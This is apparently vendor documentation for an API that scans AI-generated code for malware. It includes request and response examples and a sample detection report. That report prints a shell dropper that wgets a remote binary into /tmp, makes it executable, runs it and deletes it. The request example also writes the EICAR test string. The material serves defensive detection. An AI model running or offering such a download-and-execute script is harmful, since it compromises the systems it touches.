---
layout: documentation
title: Detect Malicious Code
description: Scan and block AI-generated code that may be harmful or introduce vulnerabilities
category: prisma-airs
---

## Overview

This feature protects against scenarios where attackers could exploit Large Language Models (LLMs) to produce harmful code. This detection is essential for AI applications that use LLMs to generate and run code, such as developer tools and automated systems. It supports multiple languages including Javascript, Python, VBScript, Powershell, Batch, Shell, and Perl.

Enable Malicious Code Detection in the API security profile to enable this detection.

## The Risk of AI-Generated Code

AI systems can inadvertently generate:

- **Malware**: Viruses, trojans, and ransomware
- **Backdoors**: Hidden access mechanisms
- **Exploits**: Code targeting known vulnerabilities
- **Injection Attacks**: SQL, XSS, command injection
- **Supply Chain Attacks**: Malicious dependencies
- **Cryptominers**: Unauthorized mining code

## API Example

### Request Format

The following cURL request demonstrates scanning for malicious code in AI-generated content:

```bash
curl -L 'https://service.api.aisecurity.paloaltonetworks.com/v1/scan/sync/request' \
--header 'Content-Type: application/json' \
--header 'x-pan-token: your-API-key' \
--data '{
 "tr_id": "1111",
 "ai_profile": {
   "profile_name": "dummy-malicious-code-profile"
  },
"metadata": {
   "app_user": "test-user2",
   "ai_model": "Test AI model"
 },
 "contents": [
   {
     "code_response": "def create_eicar_file(filename):\n    eicar_string = \"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\"\n    \n    with open(filename, '\''w'\'') as f:\n      f.write(eicar_string)\n      \n    print(f\"EICAR test file created: {filename}\")\n    \nif __name__ == \"__main__\":\n    create_eicar_file(\"eicar_test.txt\")\n\n"
   }
 ]
}'
```

**Important Notes**:
- Combine multiple snippets of the same language type into one
- If the response contains multiple language snippets, invoke a separate API with each language

### Response Format

When malicious code is detected, the API returns:

```json
{
   "action" : "block",
   "category" : "malicious",
   "profile_id" : "00000000-0000-0000-0000-000000000000",
   "profile_name" : "test-qa-ui-XXX",
   "prompt_detected" : {
      "dlp" : false,
      "injection" : false,
      "malicious_code" : true,
      "toxic_content" : false,
      "url_cats" : false
   },
   "report_id" : "R00000000-0000-0000-0000-000000000000",
   "response_detected" : {},
   "scan_id" : "00000000-0000-0000-0000-000000000000",
   "tr_id" : "1628"
}
```

**Key Response Fields**:
- `prompt_detected.malicious_code`: `true` indicates malicious code was detected
- `category`: Set to `"malicious"` when malicious code is found
- `action`: Based on your API security profile settings (e.g., `"block"`)

## Detailed Scan Report

The malicious code report shows all code snippets that are extracted and analyzed:

```json
{
   "detection_results" : [
      {
         "action" : "allow",
         "data_type" : "prompt",
         "detection_service" : "dlp",
         "result_detail" : {
            "dlp_report" : {
               "data_pattern_rule1_verdict" : "NOT_MATCHED",
               "data_pattern_rule2_verdict" : "",
               "dlp_profile_id" : "00000000",
               "dlp_profile_name" : "Sensitive Content",
               "dlp_report_id" : "000000000000000000000000000000000000000000000000000000000000000"
            }
         },
         "verdict" : "benign"
      },
      {
         "action" : "allow",
         "data_type" : "prompt",
         "detection_service" : "malicious_code",
         "result_detail" : {
            "mc_report" : {
               "all_code_blocks" : [
                  "#!/bin/sh\n\nrm -rf $0\ncd /\nwget https://website.com/sp/lp -O /tmp/b\nchmod 777 /tmp/b\ncd /tmp\n./b\nrm -rf /tmp/b\nexit 0"
               ],
               "code_analysis_by_type" : [
                  {
                     "code_sha256" : "00000000000000000000000000000000000000000000000000000000000000000",
                     "file_type" : "Shell"
                  }
               ],
               "verdict" : "malicious"
            }
         },
         "verdict" : "malicious"
      },
      {
         "action" : "allow",
         "data_type" : "prompt",
         "detection_service" : "pi",
         "result_detail" : {},
         "verdict" : "benign"
      },
      {
         "action" : "allow",
         "data_type" : "prompt",
         "detection_service" : "tc",
         "result_detail" : {
            "tc_report" : {
               "confidence" : "",
               "verdict" : "benign"
            }
         },
         "verdict" : "benign"
      },
      {
         "action" : "allow",
         "data_type" : "prompt",
         "detection_service" : "uf",
         "result_detail" : {
            "urlf_report" : [
               {
                  "action" : "allow",
                  "categories" : [
                     "malware"
                  ],
                  "risk_level" : "Not Given",
                  "url" : "https://website.com/sp/lp"
               }
            ]
         },
         "verdict" : "benign"
      }
   ],
   "report_id" : "0000000000-0000-0000-0000-000000000000",
   "req_id" : 0,
   "scan_id" : "00000000-0000-0000-0000-000000000000",
   "transaction_id" : "1111"
}
```

**Malicious Code Report Fields**:
- `all_code_blocks`: Array of all code snippets extracted from the prompt or response
- `code_analysis_by_type`: SHA-256 ID and file type of analyzed code
- `verdict`: `"malicious"` when harmful code is detected

## Supported Languages

- **Javascript**: Browser and Node.js code
- **Python**: Script-based attacks
- **VBScript**: Windows scripting
- **PowerShell**: Windows command execution
- **Batch**: Windows batch files
- **Shell**: Unix/Linux shell scripts
- **Perl**: Script-based exploits

## Common Threat Patterns

### Malware Signatures
- EICAR test files
- Known virus patterns
- Trojan behaviors
- Ransomware encryption

### Command Execution
- System command injection
- Remote code execution
- Privilege escalation
- File system manipulation

### Network Attacks
- Reverse shells
- Data exfiltration
- Command & control communication
- Port scanning

## Use Cases

### Developer Tools
- Validate AI-generated code before execution
- Protect code completion features
- Secure automated code generation

### Security Applications
- Analyze suspicious scripts
- Detect malware patterns
- Prevent exploit generation

### Compliance Requirements
- Secure development practices
- Code review automation
- Supply chain security

## Performance Considerations

- **Multi-language Support**: Single API supports all major languages
- **Code Extraction**: Automatically extracts code from responses
- **SHA-256 Analysis**: Each code block is hashed and analyzed
- **Real-time Detection**: Synchronous scanning for immediate protection

## Related Resources

- [API Reference]({{ site.baseurl }}/developers/api)
- [Overview]({{ site.baseurl }}/prisma-airs/overview)
- [Database Security Attack Detection]({{ site.baseurl }}/prisma-airs/database-security-attack)